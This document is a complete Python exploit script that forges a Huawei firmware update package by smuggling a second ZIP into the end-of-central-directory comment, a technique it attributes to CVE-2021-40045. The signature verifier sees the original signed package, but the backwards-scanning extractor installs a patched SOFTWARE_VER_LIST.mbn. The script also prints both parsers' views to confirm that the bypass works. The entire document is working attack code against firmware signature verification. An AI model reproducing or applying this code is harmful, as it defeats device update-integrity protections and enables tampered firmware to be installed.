#!/usr/bin/env python3
"""
Build the EOCD-confusion package (CVE-2021-40045 technique).

Layout produced:

    [ original ZIP: local headers, data, central directory ][ EOCD ][ comment ]
        comment = [ Huawei's original "signed by SignApk" PKCS#7 block ]
                  [ smuggled ZIP ]

The smuggled ZIP contains one new local header (for the modified
SOFTWARE_VER_LIST.mbn) plus a central directory listing all ten entries. Because a
central directory entry records the ABSOLUTE file offset of its local header, the
other nine entries - UPDATE.APP included - point straight back at the original
data. Growth is a couple of kilobytes, not a second 2 GB copy, which also keeps us
clear of the FAT32 single-file limit.

Readers:
  recovery's signature verifier -> first EOCD -> pristine package, signature OK
  minzip (walks backwards)      -> last EOCD  -> modified SOFTWARE_VER_LIST.mbn
  UPDATE.APP -> identical bytes either way; the firmware image stays authentic.

Central directory record layout (46 bytes + variable), field order:
  sig(4) ver_made(2) ver_need(2) flags(2) method(2) mtime(2) mdate(2)
  crc(4) csize(4) usize(4) nlen(2) elen(2) clen(2) disk_start(2)
  iattr(2) eattr(4) doff(4)
"""
import os
import struct
import zlib
import zipfile

SRC = "/tmp/fw3/Software/dload/update_sd.zip"
OUTDIR = "/home/placeless/dev/p20-root/firmware/eocd"
OUT = os.path.join(OUTDIR, "update_sd.zip")

ADDITIONS = """ANE-LX2J 9.1.0.132(C635E4R1P1)
9.1.0.132(C635E4R1P1)
C635E4R1P1
"""
EOCD_SIG = b"PK\x05\x06"
CEN_SIG = b"PK\x01\x02"

CEN_FMT = "<IHHHHHHIIIHHHHHII"     # 46 bytes: 6 H before the 3 I's
LOC_FMT = "<IHHHHHIIIHH"           # 30 bytes
EOCD_FMT = "<IHHHHIIH"             # 22 bytes

os.makedirs(OUTDIR, exist_ok=True)
orig = open(SRC, "rb").read()
size = len(orig)

pos = orig.rfind(EOCD_SIG)
assert pos != -1, "no EOCD"
disk, cd_disk, n_disk, n_total, cd_size, cd_off, clen = struct.unpack(
    "<HHHHIIH", orig[pos + 4:pos + 22])
assert pos + 22 + clen == size, "unexpected layout: trailing data after comment"
comment = orig[pos + 22:pos + 22 + clen]
print(f"original EOCD @{pos:#x}  comment_len={clen}  entries={n_total}  cd_off={cd_off:#x}")

# ---- parse original central directory
cd = orig[cd_off:cd_off + cd_size]
entries = []
p = 0
while p < len(cd):
    assert cd[p:p + 4] == CEN_SIG, f"bad central header at {p}"
    f = struct.unpack(CEN_FMT, cd[p:p + 46])
    nlen, elen, clen2 = f[10], f[11], f[12]
    rec_len = 46 + nlen + elen + clen2
    entries.append(dict(
        ver_made=f[1], ver_need=f[2], flags=f[3], method=f[4], mtime=f[5], mdate=f[6],
        crc=f[7], csize=f[8], usize=f[9], nlen=nlen, elen=elen, clen2=clen2,
        disk_start=f[13], iattr=f[14], eattr=f[15], doff=f[16],
        name=cd[p + 46:p + 46 + nlen],
        extra=cd[p + 46 + nlen:p + 46 + nlen + elen],
        cmt=cd[p + 46 + nlen + elen:p + 46 + nlen + elen + clen2]))
    p += rec_len
assert p == len(cd), "central directory size mismatch"
print(f"parsed {len(entries)} entries")
for e in entries:
    print(f"   {e['name'].decode():50} method={e['method']} csize={e['csize']:>11} off={e['doff']:#x}")

# ---- replacement payload
target = b"SOFTWARE_VER_LIST.mbn"
hits = [e for e in entries if e["name"] == target]
assert len(hits) == 1
old_entry = hits[0]
lh = orig[old_entry["doff"]:]
n_o, e_o = struct.unpack("<HH", lh[26:30])
data_start = old_entry["doff"] + 30 + n_o + e_o
old_raw = orig[data_start:data_start + old_entry["csize"]]
old_plain = zlib.decompress(old_raw, -15) if old_entry["method"] == 8 else old_raw
new_plain = old_plain.rstrip(b"\n") + b"\n" + ADDITIONS.encode()
print(f"\n{target.decode()}: {len(old_plain)} -> {len(new_plain)} bytes")

co = zlib.compressobj(9, zlib.DEFLATED, -15)
new_cdata = co.compress(new_plain) + co.flush()
new_crc = zlib.crc32(new_plain) & 0xFFFFFFFF
new_method = 8

# ---- assemble the smuggled block
block_abs = pos + 22 + clen          # appended right after the original comment
BODY = bytearray()

new_local = struct.pack(LOC_FMT, 0x04034b50, 20, old_entry["flags"], new_method,
                        old_entry["mtime"], old_entry["mdate"], new_crc,
                        len(new_cdata), len(new_plain), len(target), 0) + target
new_local_abs = block_abs + len(BODY)
BODY += new_local + new_cdata

cdn_start_rel = len(BODY)

for e in entries:
    if e["name"] == target:
        crc, csize, usize, method, doff = new_crc, len(new_cdata), len(new_plain), new_method, new_local_abs
    else:
        crc, csize, usize, method, doff = e["crc"], e["csize"], e["usize"], e["method"], e["doff"]
    BODY += struct.pack(CEN_FMT, 0x02014b50, e["ver_made"], e["ver_need"], e["flags"],
                        method, e["mtime"], e["mdate"], crc, csize, usize,
                        len(e["name"]), len(e["extra"]), len(e["cmt"]),
                        e["disk_start"], e["iattr"], e["eattr"], doff)
    BODY += e["name"] + e["extra"] + e["cmt"]

cdn_size = len(BODY) - cdn_start_rel
cdn_abs = block_abs + cdn_start_rel
BODY += struct.pack(EOCD_FMT, 0x06054b50, 0, 0, len(entries), len(entries),
                    cdn_size, cdn_abs, 0)
smuggled = bytes(BODY)
print(f"smuggled block {len(smuggled):,} bytes  (central dir @ {cdn_abs:#x})")

# ---- assemble the output file
new_comment_len = clen + len(smuggled)
assert new_comment_len <= 0xFFFF
out = (orig[:pos + 20] + struct.pack("<H", new_comment_len)
       + orig[pos + 22:] + smuggled)
open(OUT, "wb").write(out)
print(f"\nwrote {OUT} ({len(out):,} bytes, +{len(out) - size:,} vs original)")

# ---- view 1: what a parser using the FIRST EOCD sees (the verifier)
print("\n########## verifier's view (first EOCD) - must look pristine")
with zipfile.ZipFile(OUT) as z:
    for i in z.infolist():
        print(f"   {i.file_size:>12} {i.filename}")
    print("   SOFTWARE_VER_LIST.mbn =", repr(z.read("SOFTWARE_VER_LIST.mbn")))

# ---- view 2: what a backwards-scanning parser sees (minzip)
print("\n########## extractor's view (last EOCD) - must show the patched file")
data = open(OUT, "rb").read()
last = data.rfind(EOCD_SIG)
s = struct.unpack(EOCD_FMT, data[last:last + 22])
print(f"   last EOCD @{last:#x}  cd_off={s[6]:#x} cd_size={s[5]} entries={s[4]}")
cdx = data[s[6]:s[6] + s[5]]
q = 0
while q < len(cdx):
    f = struct.unpack(CEN_FMT, cdx[q:q + 46])
    nlen, elen, cl3, off, cs, me = f[10], f[11], f[12], f[16], f[8], f[4]
    nm = cdx[q + 46:q + 46 + nlen]
    payload = data[off:off + cs]
    if nm == target:
        body = zlib.decompress(payload, -15) if me == 8 else payload
        assert body == new_plain, "smuggled payload mismatch"
        print(f"   {nm.decode():50} off={off:#x} -> {body!r}   <== patched")
    else:
        print(f"   {nm.decode():50} off={off:#x} -> points into original data")
    q += 46 + nlen + elen + cl3
